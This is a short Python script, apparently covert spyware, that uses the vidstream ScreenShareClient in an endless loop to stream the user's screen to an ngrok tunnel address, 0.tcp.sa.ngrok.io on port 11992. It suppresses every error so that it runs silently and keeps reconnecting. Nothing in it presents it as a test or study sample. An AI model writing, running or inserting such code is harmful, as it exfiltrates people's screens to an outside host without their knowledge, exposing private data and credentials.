####################################################################
from vidstream import ScreenShareClient
import time
####################################################################


####################################################################
while(True):
    Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
    try: 
        Client.start_stream()
        try:
            time.sleep(3)
            Client.stop_stream()
        except:pass
    except:pass

####################################################################
